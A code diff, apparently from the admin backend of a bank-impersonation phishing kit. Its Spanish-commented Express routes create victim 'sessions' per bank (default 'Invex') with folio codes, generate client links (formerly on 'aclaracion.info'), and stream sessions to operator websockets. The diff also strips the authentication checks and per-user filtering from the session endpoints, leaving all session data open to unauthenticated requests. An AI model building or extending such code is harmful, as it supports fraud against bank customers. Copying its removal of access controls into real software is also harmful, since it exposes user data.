@@ -446,15 +446,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.get('/api/sessions', async (req, res) => {
     try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-      
       const { type = 'current' } = req.query;
-      const currentUser = req.user;
-      const isAdmin = currentUser.role === 'admin';
-      
-      // Obtener todas las sesiones según el tipo
+
       let sessions;
       if (type === 'saved') {
         sessions = await storage.getSavedSessions();
@@ -463,20 +456,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } else {
         sessions = await storage.getCurrentSessions();
       }
-      
-      // Filtrar las sesiones según el rol del usuario
-      let filteredSessions;
-      if (isAdmin) {
-        // El administrador puede ver todas las sesiones
-        filteredSessions = sessions;
-        console.log(`Admin: Mostrando todas las sesiones (${sessions.length})`);
-      } else {
-        // Usuarios regulares solo ven sus propias sesiones
-        filteredSessions = sessions.filter(session => session.createdBy === currentUser.username);
-        console.log(`Usuario ${currentUser.username}: Mostrando ${filteredSessions.length} sesiones propias`);
-      }
-      
-      res.json(filteredSessions);
+
+      res.json(sessions);
     } catch (error) {
       console.error("Error fetching sessions:", error);
       res.status(500).json({ message: "Error fetching sessions" });
@@ -485,20 +466,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/sessions', async (req, res) => {
     try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-      
       const { banco = "Invex" } = req.body;
       const sessionId = nanoid(10);
-      const currentUser = req.user;
-      
       const session = await storage.createSession({ 
         sessionId, 
         banco,
         folio: nanoid(6),
         pasoActual: ScreenType.FOLIO,
-        createdBy: currentUser.username, // Registrar el usuario que creó la sesión
       });
       res.json(session);
     } catch (error) {
@@ -615,18 +589,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: banco as string,
         folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username, // Registrar el usuario que creó la sesión
       });
 
-      // Utilizamos el dominio aclaracion.info en lugar de los dominios de Replit
-      const domain = 'aclaracion.info';
+      // Obtenemos el dominio base desde las variables de entorno
+      const { REPLIT_DOMAINS } = process.env;
+      const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
 
-      // Armamos el enlace final usando el dominio especificado
+      // En lugar de intentar usar subdominios, usaremos rutas diferentes
+      // La ruta del cliente tendrá un prefijo especial que la hace diferente 
+      // del panel de administración
+
+      // Armamos el enlace final - usando la misma URL base pero con una ruta específica
       const link = `https://${domain}/client/${sessionId}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}`);
+      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
@@ -638,23 +616,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
           userName: user.username
         }
       }));
-
-      // Obtener todas las sesiones actuales e informar por websocket
-      setTimeout(async () => {
-        try {
-          const sessions = await storage.getCurrentSessions();
-          console.log(`Total de sesiones: ${sessions.length}`);
-          console.log(`Sesiones para ${user.username}: ${sessions.filter(s => s.createdBy === user.username).length}`);
-          
-          // Notificar la actualización de sesiones
-          broadcastToAdmins(JSON.stringify({
-            type: 'INIT_SESSIONS',
-            data: sessions
-          }));
-        } catch (err) {
-          console.error("Error al actualizar las sesiones después de crear:", err);
-        }
-      }, 500); // Pequeño retraso para asegurar que la sesión esté guardada
 
       res.json({ 
         sessionId, 
@@ -682,44 +643,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
             adminClients.add(ws);
             console.log('Admin client registered');
 
-            // Identifica el usuario en la sesión
-            const cookies = req.headers.cookie?.split(';').reduce((acc, cookie) => {
-              const [key, value] = cookie.trim().split('=');
-              return { ...acc, [key]: value };
-            }, {} as Record<string, string>) || {};
-            
-            let userId = null;
-            if (cookies.connect_sid) {
-              try {
-                // Intentar extraer información del usuario de la sesión HTTP
-                // Esto es un parche temporal hasta que podamos mejorar la autenticación para WebSockets
-                const allSessions = await storage.getCurrentSessions();
-                
-                // Buscar al usuario conectado por su cookie y enviar sesiones
-                try {
-                  // Enviar todas las sesiones - el cliente ya sabe filtrar las sesiones por usuario
-                  console.log(`Enviando ${allSessions.length} sesiones al cliente para filtrado en frontend`);
-                  ws.send(JSON.stringify({
-                    type: 'INIT_SESSIONS',
-                    data: allSessions
-                  }));
-                } catch (wsError) {
-                  console.error("Error enviando sesiones por WebSocket:", wsError);
-                }
-              } catch (error) {
-                console.error("Error getting sessions:", error);
-                ws.send(JSON.stringify({
-                  type: 'INIT_SESSIONS',
-                  data: []
-                }));
-              }
-            } else {
-              console.log("No cookie found, sending empty sessions");
-              ws.send(JSON.stringify({
-                type: 'INIT_SESSIONS',
-                data: []
-              }));
-            }
+            // Send sessions to the admin - current sessions by default
+            const sessions = await storage.getCurrentSessions();
+            ws.send(JSON.stringify({
+              type: 'INIT_SESSIONS',
+              data: sessions
+            }));
 
             // Run cleanup of old sessions (more than 5 days)
             try {
